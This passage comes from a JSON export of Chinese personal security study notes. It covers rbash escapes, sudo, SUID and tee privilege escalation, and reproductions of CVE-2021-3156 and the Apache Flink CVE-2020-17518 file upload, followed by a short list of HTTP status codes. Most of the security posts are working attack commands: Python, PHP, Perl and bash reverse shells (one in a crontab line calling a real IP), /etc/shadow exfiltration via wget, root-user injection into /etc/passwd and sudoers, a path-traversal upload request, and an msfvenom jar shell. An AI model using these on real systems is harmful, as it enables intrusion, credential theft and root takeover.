id=\"ed-编辑器\"><a class=\"anchor\" href=\"#ed-编辑器\">#</a> ED - 编辑器</h2><pre><code>ed\n! '/bin/sh'\n</code></pre><h2 id=\"perl\"><a class=\"anchor\" href=\"#perl\">#</a> Perl</h2><p><code>perl -e 'system(&quot;/bin/sh&quot;);'</code></p><h2 id=\"通过ssh绕过rbash\"><a class=\"anchor\" href=\"#通过ssh绕过rbash\">#</a> 通过 SSH 绕过 rbash</h2><p>如果您知道属于 rbash shell 的用户的 ssh 凭据，则可以在 ssh 上使用以下命令来破解监狱，并通过访问适当的 bash shell 绕过 rbash。<br><code>ssh ignite@192.168.1.103 -t &quot;bash --noprofile&quot;</code></p><h2 id=\"使用expect绕过rbash\"><a class=\"anchor\" href=\"#使用expect绕过rbash\">#</a> 使用 Expect 绕过 rbash</h2><p>Expect 是一个 Unix 程序，可以根据脚本与其他交互式程序 “对话”。在脚本之后，Expect 知道程序可以期望什么，正确的响应应该是什么。</p><pre><code>expect\nspwan sh\nsh\n</code></pre><h2 id=\"man-绕过rbash\"><a class=\"anchor\" href=\"#man-绕过rbash\">#</a> man 绕过 rbash</h2><pre><code>man man\n!'sh'\n</code></pre><h2 id=\"通过反向shell绕过rbash\"><a class=\"anchor\" href=\"#通过反向shell绕过rbash\">#</a> 通过反向 Shell 绕过 rbash</h2><p>您也可以选择反向 shellcode 绕过 rbash，这里我们使用 python 反向 shellcode（penetestmokey），这会将 “sh：Bourne shell” 扔到正在监听的 netcat 上的监听机器（在本例中为 Kali Linux）我们的 Kali Linux。<br><code>nc -lvp 1234</code><br>运行侦听器后，我们将运行以下命令。<br><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;LISTENING IP&quot;,LISTENING PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p><pre><code>php -r '$sock=fsockopen(&quot;LISTENING IP&quot;,LISTENING PORT);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'\n</code></pre><!-- rebuild by hrmmi -->",
            "tags": [
                "提权知识",
                "提权知识"
            ]
        },
        {
            "id": "http://avenue.cool/Increase-authority/Linux%20sudo%E6%8F%90%E6%9D%83/",
            "url": "http://avenue.cool/Increase-authority/Linux%20sudo%E6%8F%90%E6%9D%83/",
            "title": "Linux  sudo 提权",
            "date_published": "2021-02-02T02:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h2 id=\"什么是sudo\"><a class=\"anchor\" href=\"#什么是sudo\">#</a> 什么是 SUDO ?</h2><p>sudo 是 linux 系统管理指令，是允许系统管理员让普通用户执行一些或者全部的 root 命令的一个工具，如 halt，reboot，su 等等。这样不仅减少了 root 用户的登录 和管理时间，同样也提高了安全性。sudo 不是对 shell 的一个代替，它是面向每个命令的。<br>基础</p><p>它的特性主要有这样几点：<br>§ sudo 能够限制用户只在某台主机上运行某些命令。<br>§ sudo 提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务器。<br>§ sudo 使用时间戳文件来执行类似的 “检票” 系统。当用户调用 sudo 并且输入它的密码时，用户获得了一张存活期为 5 分钟的票（这个值可以在编译的时候改变）。<br>§ sudo 的配置文件是 sudoers 文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存放的位置默认是在 /etc/sudoers，属性必须为 0440。</p><p>在 sudo 于 1980 年前后被写出之前，一般用户管理系统的方式是利用 su 切换为超级用户。但是使用 su 的缺点之一在于必须要先告知超级用户的密码。<br>sudo 使一般用户不需要知道超级用户的密码即可获得权限。首先超级用户将普通用户的名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信息，登记在特殊的文件中（通常是 /etc/sudoers），即完成对该用户的授权（此时该用户称为 “sudoer”）；在一般用户需要取得特殊权限时，其可在命令前加上 “sudo”，此时 sudo 将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为 5 分钟，可在 /etc/sudoers 自定义），使用 sudo 不需要再次输入密码。<br>由于不需要超级用户的密码，部分 Unix 系统甚至利用 sudo 使一般用户取代超级用户作为管理帐号，例如 Ubuntu、Mac OS X 等。</p><p>参数说明：<br>・-V 显示版本编号<br>・-h 会显示版本编号及指令的使用方式说明<br>・-l 显示出自己（执行 sudo 的使用者）的权限<br>・-v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码<br>・-k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）<br>・-b 将要执行的指令放在背景执行<br>・-p prompt 可以更改问密码的提示语，其中 % u 会代换为使用者的帐号名称， % h 会显示主机名称<br>・-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码）<br>・-s 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell<br>・-H 将环境变数中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）<br>・command 要以系统管理者身份（或以 -u 更改为其他人）执行的指令</p><h2 id=\"sudoer文件\"><a class=\"anchor\" href=\"#sudoer文件\">#</a> Sudoer 文件</h2><p>sudoers 文件主要有三部分组成：<br>・sudoers 的默认配置（default），主要设置 sudo 的一些缺省值<br>・alias（别名），主要有 Host_Alias|Runas_Alias|User_Alias|Cmnd_Alias。<br>・安全策略（规则定义）—— 重点。</p><h3 id=\"基本格式\"><a class=\"anchor\" href=\"#基本格式\">#</a> 基本格式</h3><pre><code>user/group  ALL=(ALL)   ALL\n• user/group:\n• 表示允许哪个用户或组可以使用sudo\n\n可以指定具体某个用户，也可以将多个用户添加到别名里\n\nUser_Alias ADMINS =chirou, panghu\nADMIN   ALL=（ALL）   ALL\n# 指定系统组，在组名前面加上%\n%group  ALL=（ALL）   ALL\n</code></pre><h4 id=\"第一个all\"><a class=\"anchor\" href=\"#第一个all\">#</a> 第一个 ALL：</h4><p>・表示允许在哪台主机登录<br>可以指定主机 ip 或主机名，指定的是服务端 ip，与从哪个客户端连接无关。<br><code>user 192.168.0.2=（ALL） ALL</code></p><p>/etc/sudoers 文件可以共享复制到多部主机上，这样只修改一份文件，指定哪个用户可以在哪台主机使用 sudo 命令，就可以直接拷贝到其他主机上，非该主机用户不能使用 sudo, 这样就能分主机管理，互不影响。</p><h4 id=\"第二个all\"><a class=\"anchor\" href=\"#第二个all\">#</a> 第二个 ALL：</h4><p>・表示能转换成哪个用户<br>胖虎可以在所有主机上转换成所有用户执行任何命令<br><code>panghu ALL=(ALL) ALL</code></p><h4 id=\"第三个all\"><a class=\"anchor\" href=\"#第三个all\">#</a> 第三个 ALL：</h4><pre><code>• 表示转换后能执行的命令\nALL表示所有命令，可以使用绝对路径指定某些命令\n/usr/sbin/ifconfig，/bin/vim /f1\n\n# 指定不能使用某些命令\n!/bin/vim /f1\n\n# 指定使用某些命令不需要输入密码\nNOPASSWD：/usr/sbin/ifconfig\n\n# 可以使用命令别名\n\nNOPASSWD:命令别名\ntouhid ALL = (root) NOPASSWD: /usr/bin/find\n说明3：上面的命令，使用户可以从任何终端运行，以root用户身份运行命令find 而无需密码。\n</code></pre><h2 id=\"sudo执行流程\"><a class=\"anchor\" href=\"#sudo执行流程\">#</a> sudo 执行流程:</h2><p>1、普通用户执行 sudo 命令，会检查 /var/db/sudo 是否存在时间戳缓存<br>2、如果存在则不需要输入密码，否则需要输入用户与密码<br>3、输入密码会检查是否是该用户、是否拥有权限。<br>4、如果有则执行，没有则报错退出。</p><h2 id=\"sudo-提权方法\"><a class=\"anchor\" href=\"#sudo-提权方法\">#</a> sudo 提权方法:</h2><h3 id=\"使用查找命令\"><a class=\"anchor\" href=\"#使用查找命令\">#</a> 使用查找命令</h3><pre><code>sudo find / etc / passwd -exec / bin / sh \\;\nsudo find / bin -name nano -exec / bin / sh \\;\n</code></pre><h3 id=\"使用vim命令\"><a class=\"anchor\" href=\"#使用vim命令\">#</a> 使用 Vim 命令</h3><p><code>sudo vim -c'！sh'</code></p><h3 id=\"使用nmap命令\"><a class=\"anchor\" href=\"#使用nmap命令\">#</a> 使用 Nmap 命令</h3><pre><code>sudo nmap-交互式\nnmap&gt;！sh\nsh-4.1＃\n注意：nmap –interactive选项在最新的nmap中不可用。\n也可以\necho“ os.execute（'/ bin / sh'）”&gt; /tmp/shell.nse &amp;&amp; sudo nmap --script = / tmp / shell.nse\n</code></pre><h3 id=\"使用man命令\"><a class=\"anchor\" href=\"#使用man命令\">#</a> 使用 Man 命令</h3><pre><code>sudo man man\n之后按！按下并按Enter\n</code></pre><h3 id=\"使用lessmore命令\"><a class=\"anchor\" href=\"#使用lessmore命令\">#</a> 使用 less/more 命令</h3><pre><code>sudo less / etc / hosts\nsudo more / etc / hosts\n之后按！按下并按Enter\n</code></pre><h3 id=\"使用awk命令\"><a class=\"anchor\" href=\"#使用awk命令\">#</a> 使用 awk 命令</h3><p><code>sudo awk'BEGIN {system（“ / bin / sh”）}'</code></p><h3 id=\"使用nano命令\"><a class=\"anchor\" href=\"#使用nano命令\">#</a> 使用 nano 命令</h3><pre><code>nano是使用此编辑器的文本编辑器，在您需要切换用户之后，您可以修改passwd文件并将用户添加为root特权。在/ etc / passwd中添加此行，以将用户添加为root特权。\ntouhid：6 bxwJfzor \nsudo nano / etc / passwd   注意： ctrl + o 是保存， ctrl +x 是退出\n现在切换用户密码是：test\nsu touhid\n</code></pre><h3 id=\"使用wget命令\"><a class=\"anchor\" href=\"#使用wget命令\">#</a> 使用 wget 命令</h3><p>这种非常酷的方式要求 Web 服务器下载文件。这样我从没在任何地方见过。让我们解释一下。<br>在 At 客者一边。<br>・首先将 Target 的 /etc/passwd 文件复制到攻击者计算机。<br>・修改文件，并在上一步中保存的密码文件中添加用户到攻击者计算机。<br>・仅附加此行 =&gt; touhid：<br>・将 passwd 文件托管到使用任何 Web 服务器的主机。</p><p>在要提权主机方面。</p><pre><code>sudo wget http://192.168.56.1:8080/passwd -O / etc / passwd\n现在切换用户密码是：test\nsu touhid\n注意：如果您要从服务器上转储文件，例如root的ssh密钥，shadow文件等。\nsudo wget --post-file = / etc / shadow 192.168.56.1:8080\n攻击者的设置侦听器：nc – lvp 8080\n</code></pre><h3 id=\"使用apache命令\"><a class=\"anchor\" href=\"#使用apache命令\">#</a> 使用 apache 命令</h3><p>但是，我们无法获得 Shell 和 Cant 编辑系统文件。<br>但是使用它 我们可以查看系统文件。</p><pre><code>sudo apache2 -f / etc / shadow\n输出是这样的：\nSyntax error on line 1 of /etc/shadow:\nInvalid command 'root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration\n可悲的是没有shell。但是我们可以现在提取root哈希，然后破解了哈希\n</code></pre><!-- rebuild by hrmmi -->",
            "tags": [
                "提权知识",
                "提权知识"
            ]
        },
        {
            "id": "http://avenue.cool/Increase-authority/Linux%20tee%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83/",
            "url": "http://avenue.cool/Increase-authority/Linux%20tee%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83/",
            "title": "Linux tee命令提权",
            "date_published": "2021-02-02T02:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h1 id=\"tee命令usrbintee\"><a class=\"anchor\" href=\"#tee命令usrbintee\">#</a> tee 命令（usr/bin/tee）</h1><p>这是在 DC-4 靶机上遇到的</p><pre><code>先看以下tee的用法\n####################################################################\nzaq@instance-f95a3vkt:/bin$ /usr/bin/tee --help\nUsage: /usr/bin/tee [OPTION]... [FILE]...\nCopy standard input to each FILE, and also to standard output.\n  -a, --append              append to the given FILEs, do not overwrite\n  -i, --ignore-interrupts   ignore interrupt signals\n  -p                        diagnose errors writing to non pipes\n      --output-error[=MODE]   set behavior on write error.  See MODE below\n      --help     display this help and exit\n      --version  output version information and exit\n####################################################################\n把输入写入文件，如果是-a的话就会在最后新起一行追加内容\n</code></pre><h2 id=\"tee的利用\"><a class=\"anchor\" href=\"#tee的利用\">#</a> tee 的利用</h2><pre><code>当 /bin/sh指向/bin/bash的时候(ubuntu默认这样，当前的靶机也是这样)，反弹shell用bash的话得这样弹：\n* * * * * root bash -c &quot;bash -i  &gt;&amp;/dev/tcp/106.13.124.93/2333 0&gt;&amp;1&quot;\n这样弹shell的时候不知道为什么很慢，耐心等等\n</code></pre><p>或者：</p><pre><code>*/1 * * * * root perl -e 'use Socket;$i=&quot;106.13.124.93&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'\n</code></pre><p><code>echo &quot;定时计划任务&quot;sudo tee -a /etc/crontab</code><br>值得注意的是：chmod 4777 /bin/bash 不会有这种效果 (曾经看到这个解答，我给忘了，你不用管为什么了，自己试试就好了)</p><h2 id=\"passwd添加用户\"><a class=\"anchor\" href=\"#passwd添加用户\">#</a> passwd 添加用户</h2><p>前提是能够更改 test 用户的密码<br><code>echo &quot;test:x:0:0::/home/admin:/bin/bash&quot; | sudo tee -a /etc/sudoers</code></p><h2 id=\"sudoers文件\"><a class=\"anchor\" href=\"#sudoers文件\">#</a> sudoers 文件</h2><p><code>echo &quot;charles ALL=(ALL:ALL) ALL&quot; | sudo tee -a /etc/sudoers</code></p><!-- rebuild by hrmmi -->",
            "tags": [
                "提权知识",
                "提权知识"
            ]
        },
        {
            "id": "http://avenue.cool/Increase-authority/linux%20SUID%20%E6%8F%90%E6%9D%83/",
            "url": "http://avenue.cool/Increase-authority/linux%20SUID%20%E6%8F%90%E6%9D%83/",
            "title": "linux SUID 提权",
            "date_published": "2021-02-02T02:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h1 id=\"简单介绍一下概念\"><a class=\"anchor\" href=\"#简单介绍一下概念\">#</a> 简单介绍一下概念</h1><p>SUID（设置用户 ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有 SUID 权限，那么就可以利用系统中的二进制文件和工具来进行 root 提权。</p><p>已知的可用来提权的 linux 可行性的文件列表如下：<br><code>Nmap、Vim、find、Bash、More、Less、Nano、cp</code></p><p>以下命令可以发现系统上运行的所有 SUID 可执行文件。具体来说，命令将尝试查找具有 root 权限的 SUID 的文件。</p><pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null\nfind / -perm -u=s -type f 2&gt;/dev/null\nfind / -user root -perm -4000 -exec ls -ldb {} \\;\n</code></pre><p>因为它们的权限中包含 &quot;s&quot;，并且对应的是 root 权限。</p><pre><code>ls -l /usr/bin/nmap\n-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap\n</code></pre><h2 id=\"nmap\"><a class=\"anchor\" href=\"#nmap\">#</a> NMAP</h2><p>较旧版本的 Nmap（2.02 至 5.21）具有交互模式，允许用户执行 shell 命令。由于 Nmap 在使用 root 权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。</p><p><code>nmap -V</code></p><p>交互模式可以通过执行 Nmap 参数 &quot;interactive&quot;</p><p><code>nmap --interactive</code><br>Nmap - 交互模式<br>以下命令将提供一个提升的 shell。</p><pre><code>nmap&gt; !sh\nsh-3.2# whoami\nroot\n</code></pre><p>提权至 Root 权限，也可以通过 Metasploit 模块对 Nmap 的二进制文件进行权限提升。<br>exploit/unix/local/setuid_nmap</p><h2 id=\"find\"><a class=\"anchor\" href=\"#find\">#</a> Find</h2><p>如果 Find 命令也是以 Suid 权限运行的话，则将通过 find 执行的所有命令都会以 root 权限执行。</p><pre><code>touch pentestlab\nfind pentestlab -exec whoami \\;\n</code></pre><p>Find 命令权限提升<br>大部分 Linux 操作系统都安装了 netcat，因此也可以被利用来将权限提升至 root。</p><pre><code>find pentestlab -exec netcat -lvp 5555 -e /bin/sh \\;\n</code></pre><p>通过 Find 运行 Netcat，连接上去就会直接获取到一个 Root 权限的 shell。</p><pre><code>netcat 192.168.1.189 5555\nid\ncat /etc/shadow\n</code></pre><h2 id=\"vim\"><a class=\"anchor\" href=\"#vim\">#</a> VIM</h2><p>Vim 是 Linux 环境下的一款文件编辑器。但是，如果以 SUID 运行的话，它会继承 root 用户的权限，因此可以读取系统上的所有文件。<br>Vim - Root 权限的 shell</p><pre><code>vim.tiny /etc/shadow\nvim.tiny\n Press ESC key\n:set shell=/bin/sh\n:shell\n</code></pre><h2 id=\"bash\"><a class=\"anchor\" href=\"#bash\">#</a> Bash</h2><p>以下命令将以 root 权限打开一个 bash shell。</p><pre><code>bash -p\nbash-3.2# id\nuid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)\n</code></pre><h2 id=\"less\"><a class=\"anchor\" href=\"#less\">#</a> Less</h2><p>Less 和 More 都执行以用来提权。</p><pre><code>less /etc/passwd\n!/bin/sh\nmore /home/pelle/myfile\n!/bin/bash\n</code></pre><h2 id=\"cp\"><a class=\"anchor\" href=\"#cp\">#</a> cp</h2><p>使用 cp 覆盖 /etc/shadow</p><h2 id=\"mv\"><a class=\"anchor\" href=\"#mv\">#</a> mv</h2><p>使用 mv 覆盖 /etc/shadow 或者 /etc/sudoers</p><h2 id=\"tcpdump\"><a class=\"anchor\" href=\"#tcpdump\">#</a> tcpdump</h2><pre><code>echo $'id\\ncat /etc/shadow' &gt; /tmp/.test\nchmod +x /tmp/.test\nsudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root\n</code></pre><h2 id=\"perl\"><a class=\"anchor\" href=\"#perl\">#</a> perl</h2><p>我们现在要做的就是自己构造一个用户，在密码占位符处指定密码，并且 UID 设置为 0，将其添加到 /etc/passwd 文件中。<br>首先，使用 perl 语言生成带有盐值的密码：</p><pre><code>perl -le 'print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)' \n</code></pre><p>然后执行下面这条命令，成功将 test 用户的信息加入 /etc/passwd 文件</p><pre><code>echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd\n</code></pre><h2 id=\"awk\"><a class=\"anchor\" href=\"#awk\">#</a> awk</h2><pre><code>awk 'BEGIN{system(&quot;whoami&quot;)}'\n</code></pre><!-- rebuild by hrmmi -->",
            "tags": [
                "提权知识",
                "提权知识"
            ]
        },
        {
            "id": "http://avenue.cool/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2021-3156)/",
            "url": "http://avenue.cool/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2021-3156)/",
            "title": "Linux sudo权限提升漏洞复现（CVE-2021-3156)",
            "date_published": "2021-02-01T09:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和学习整理</p></div><h1 id=\"linux-sudo权限提升漏洞复现cve-2021-3156\"><a class=\"anchor\" href=\"#linux-sudo权限提升漏洞复现cve-2021-3156\">#</a> Linux sudo 权限提升漏洞复现（CVE-2021-3156）</h1><h2 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 【原理】</h2><p>2021 年 01 月 27 日，RedHat 官方发布了 sudo 缓冲区 / 栈溢出漏洞的风险通告，普通用户可以通过利用此漏洞，而无需进行身份验证，成功获取 root 权限。<br>当 sudo 通过 - s 或 - i 命令行选项在 shell 模式下运行命令时。它将在命令参数中使用反斜杠转义特殊字符。但使用 - s 或 - i 标志运行 sudoedit 时。实际上并未进行转义，从而可能导致缓冲区溢出。只要存在 sudoers 文件 (通常是 /etc/sudoers。攻击者就可以使用本地普通用户利用 sudo 获得系统 root 权限。</p><h2 id=\"工具\"><a class=\"anchor\" href=\"#工具\">#</a> 【工具】</h2><ul><li>poc</li></ul><h2 id=\"环境搭建\"><a class=\"anchor\" href=\"#环境搭建\">#</a> 【环境搭建】</h2><p>docker 搜索 ubuntu 镜像： <code>docker search ubuntu:20.04</code><br><img data-src=\"/images/CVE-2021-3156/1.png\" alt=\"\"></p><p>然后拉取这个看起来很厉害的镜像 (Full Deskdop!)：<br><code>docker pull manishfoodtechs/xfcefulldesktop_ubuntu20.4</code></p><h2 id=\"检测方法\"><a class=\"anchor\" href=\"#检测方法\">#</a> [检测方法]：</h2><p>以非 root 用户登录系统，并运行如下命令：</p><p>sudoedit -s /</p><ul><li><p>如果响应一个以 sudoedit: 开头的报错，那么表明存在漏洞。</p></li><li><p>如果响应一个以 usage: 开头的报错，那么表明补丁已经生效。</p></li></ul><h2 id=\"漏洞复现\"><a class=\"anchor\" href=\"#漏洞复现\">#</a> 【漏洞复现】</h2><p>我们直接运行容器就行，进入容器的命令行<br><code>docker run -it manishfoodtechs/xfcefulldesktop_ubuntu20.4 /bin/bash</code><br><img data-src=\"/images/CVE-2021-3156/2.png\" alt=\"\"></p><p>此时，我们创建一个普通的用户 <code>test</code> ，切换到普通的用户</p><pre><code>useradd test\npasswd  test\nsu  test\ncd /tmp\nid\nwhoami\ncat  /etc/shadow\n\n</code></pre><p><img data-src=\"/images/CVE-2021-3156/3.png\" alt=\"\"></p><p>本地开一个 pyweb，把 poc 用 wget 下载到这个容器里:</p><p><code>python3 -m http.server 8000</code></p><p><code>wget http://192.168.11.1/CVE-2021-3156_nss_poc_ubuntu.tar.gz</code></p><p>然后解压 poc，切换到目录下 make 编译 poc:</p><pre><code>tar -zxvf CVE-2021-3156_nss_poc_ubuntu.tar.gz\ncd CVE-2021-3156\nmake\n</code></pre><p><img data-src=\"/images/CVE-2021-3156/4.png\" alt=\"\"></p><p>接下来直接执行 POC，漏洞利用成功，到此为止</p><p><img data-src=\"/images/CVE-2021-3156/5.png\" alt=\"\"></p><!-- rebuild by hrmmi -->",
            "tags": [
                "CVE漏洞复现",
                "CVE漏洞复现"
            ]
        },
        {
            "id": "http://avenue.cool/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/apache-Flink_CVE-2020-17518/",
            "url": "http://avenue.cool/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/apache-Flink_CVE-2020-17518/",
            "title": "Apache-Flink_CVE-2020-17518",
            "date_published": "2021-02-01T09:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h1 id=\"apache-flink文件上传\"><a class=\"anchor\" href=\"#apache-flink文件上传\">#</a> Apache Flink 文件上传</h1><h2 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 【原理】</h2><p>Apache Flink 是由 Apache 软件基金会开发的开源流处理框架，其核心是用 Java 和 Scala 编写的分布式流数据流引擎。Flink 以数据并行和流水线方式执行任意流数据程序，Flink 的流水线运行时系统可以执行批处理和流处理程序。此外，Flink 的运行时本身也支持迭代算法的执行。Flink 在 1.5.1 版本中引入了一个 REST handler，这允许攻击者将已上传的文件写入本地任意位置的文件中，并且可通过一个恶意修改的 HTTP 头将这些文件写入到 Flink 1.5.1 可以访问的任意位置。</p><h2 id=\"工具\"><a class=\"anchor\" href=\"#工具\">#</a> 【工具】</h2><ul><li>浏览器</li></ul><h2 id=\"步骤\"><a class=\"anchor\" href=\"#步骤\">#</a> 【步骤】</h2><p>访问：http://your-ip:8081 进入 Apache Flink 控制面板：</p><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/1.png\" alt=\"\"></p><p>打开 BUrp 构造 POC，上传文件</p><pre><code>\nPOST /jars/upload HTTP/1.1\nHost: 192.168.243.189:8081\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: application/json, text/plain, */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------13247690941547071692111317477\nContent-Length: 250\nOrigin: http://192.168.243.189:8081\nConnection: close\nReferer: http://192.168.243.189:8081/\n\n-----------------------------13247690941547071692111317477\nContent-Disposition: form-data; name=&quot;jarfile&quot;; filename=&quot;../../../../../../tmp/success&quot;\nContent-Type: text/plain\n\n\nsuccess\n-----------------------------13247690941547071692111317477-\n\n</code></pre><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/2.png\" alt=\"\"></p><p>此时，我们利用之前的任意文件读取漏洞，读取我们上传的文件，查看是否上传成功。</p><pre><code>http://192.168.243.189:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fsuccess\n\n</code></pre><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/3.png\" alt=\"\"></p><p>我们还可以上传 jar 马实现反弹监听从而远程命令执行</p><p>首先我们使用 kali 的 MSF 生成 jar 马：</p><pre><code>msfvenom -p java/shell_reverse_tcp lhost=192.168.243. lport=5555 -f jar &gt;/home/kali/Desktop/shell.jar\n</code></pre><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/4.png\" alt=\"\"></p><p>然后本地机器新建命令行窗口，使用 nc 进行端口监听：</p><p>nc -lvvp 5555</p><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/5.png\" alt=\"\"></p><p>最后把生成的 jar 马通过 Submit New Job 模块进行上传：</p><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/6.png\" alt=\"\"></p><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/7.png\" alt=\"\"></p><p>点击 Submit 即可实现 jar 马反弹监听：</p><p>可以执行远程命令：</p><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/8.png\" alt=\"\"></p><!-- rebuild by hrmmi -->",
            "tags": [
                "CVE漏洞复现",
                "CVE漏洞复现"
            ]
        },
        {
            "id": "http://avenue.cool/WEB/Web-Foundation/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/",
            "url": "http://avenue.cool/WEB/Web-Foundation/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/",
            "title": "4. WEB HTTP 状态码",
            "date_published": "2020-09-06T02:31:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h2 id=\"常见的状态码含义\"><a class=\"anchor\" href=\"#常见的状态码含义\">#</a> 常见的状态码含义：</h2><p>100 继续 ： 服务器返回此代码已收到请求的第一部分，正在等待其他部分。<br>101 切换协议： 请求者要求服务器切换协议，服务器已确认并准备切换。<br>200 成功：表示客户端发来的请求在服务器端被正常处理了。<br>301 永久移动：请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。<br>302 临时移动：服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求<br>400 Bad Request：表示请求报文中存在语法错误。<br>401 Unauthorized：表示发送的请求需要有通过 HTTP 认证的信息。<br>403 Forbidden：表明对请求资源的访问被服务器拒绝了。<br>404 Not Found：服务器无法找到请求的资源。<br>405 方法禁用：禁用请求中的方法。<br>408 请求超时： 服务器登后请求时发生超时。<br>500 Internal Server Error：表明服务器端在执行请求时发生了错误。<br>502 错误网关： 服务器作为网关或代理，从上游服务器收到无效响应。<br>503 Service Unavailable：表明服务器暂时处于超负载或进行停机维护<br>504 网关超时：服务器作为网关或代理，但是没有及时从上游服务器收到请求。<br>505 HTTP 版本不受支持：<br>服务器不支持请求中所用的 HTTP 协议版本。</p><!-- rebuild by hrmmi -->",
            "tags": [
                "WEB安全知识",
                "WEB基础知识",
                "WEB基础知识"
            ]
        },
        {
            "id": "http://avenue.cool/WEB/Information-Gathering/2.%20%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/",
            "url": "http://avenue.cool/WEB/Information-Gathering/2.%20%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/",
            "title": "2. 收集域名信息",
            "date_published": "2020-09-06T02:31:20.000Z",
